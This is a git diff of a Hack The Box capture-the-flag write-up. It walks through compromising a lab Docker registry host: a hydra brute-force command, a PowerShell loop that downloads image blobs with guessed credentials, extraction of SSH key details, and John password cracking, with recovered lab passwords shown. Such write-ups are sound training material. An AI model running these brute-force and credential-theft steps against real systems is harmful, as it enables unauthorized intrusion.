@@ -39,12 +39,13 @@ I decided to use COMMANDO from FireEye for this machine because I initially thou
 
 #
 **INITIAL ACCESS**
+
 *Docker Registry predictable  username password*
 -   There's a good exploit explanation here: [https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/](https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/)
 ![](images/hydra.png)
 -   navigating to http://docker.registry.htb/v2/ produces a log-in prompt   
 
-    -   brute forcing is needed since no other information is present. I tried typical username of ADMIN: bash.exe  -c "hydra -e nsr -l admin -P /usr/share/wordlists/rockyou.txt docker.registry.htb http-get /v2/ -Vf"
+    -   brute forcing is needed since no other information is present. I tried typical username of ADMIN: **bash.exe  -c "hydra -e nsr -l admin -P /usr/share/wordlists/rockyou.txt docker.registry.htb http-get /v2/ -Vf"**
 
 BruteForce was successful because of a predictable username/password combo and hydra's (**-e nsr**) which does 3 password attempts: the username as the password, username with blank password, and backwards username as password.
 
@@ -55,18 +56,20 @@ BruteForce was successful because of a predictable username/password combo and h
 ![](images/manifest.png)
 2. Download the blobs (i.e. the docker image pieces of the container):
     - $cred = New-Object System.Management.Automation.PSCredential -ArgumentList @('admin',(ConvertTo-SecureString -String 'admin' -AsPlainText -Force)) *** This creates an admin:admin object that can be used to log into the site.
-    - Select-String .\manifests.txt -Pattern blobsum | % {($_ -split "\s+")[2] -replace '"',""} | % { wget -Credential $cred "http://docker.registry.htb/v2/bolt-  
-image/blobs/$_" -PassThru -OutFile "$_".Replace(':','_') }
+    - Select-String .\manifests.txt -Pattern blobsum | % {($_ -split "\s+")[2] -replace '"',""} | % { wget -Credential $cred "http://docker.registry.htb/v2/bolt-image/blobs/$_" -PassThru -OutFile "$_".Replace(':','_') }
+![](images/wget.gif)
 --NOTE--
 Windows has an issues with filenames containing a semicolon ( : ), so I had to replace the semicolon with an underscore .
 3.    Check the file types, bash.exe  -c  "file sha*". According to the registry website. The files are typically stored as tarballs. So they'll need to be renamed in order to extract them
     - Rename the files to tar.gz: ls "sha*" | ren -NewName {$_.name + ".tar.gz" }
     - use tar.exe to extract: ls *.tar.gz | % {tar.exe -xvf $_}
 4. This is a HTB machine so typically the HOME directories and webserver DIR(s) are the most important. Lets start at with the **root** DIR:
-    - cat the bashrc_history file in ROOT's DIR and notice username for ssh
+     - cat the bashrc_history file in ROOT's DIR and notice username for ssh
 ![](images/bashrc.png)
+
     - cat viminfo file in ROOT's DIR and notice prior vim usage.
     - cat ..\etc\profile.d\01-ssh.sh
+
 ![](images/01-ssh.png)
 5. The passphrase for the ssh key is there: **bolt:GkOcz221Ftb3ugog**
 6. Use id_rsa private key to log in and cat user.txt
@@ -80,6 +83,7 @@ Windows has an issues with filenames containing a semicolon ( : ), so I had to r
 ![](images/backupPHP.png)
     - notice a .db file readable by everyone. I tried to look for 'admin', 'bolt', and 'root'. Using 'root' was fruitful
 ![](images/boltDB.png)
+
 9. Crack with John: bash -c "john --wordlist=/usr/share/wordlists/rockyou.txt database.hash"
     - discover creds: **admin:strawberry**
 10. Looked like installed app is called bolt (i.e. bolt/bolt)
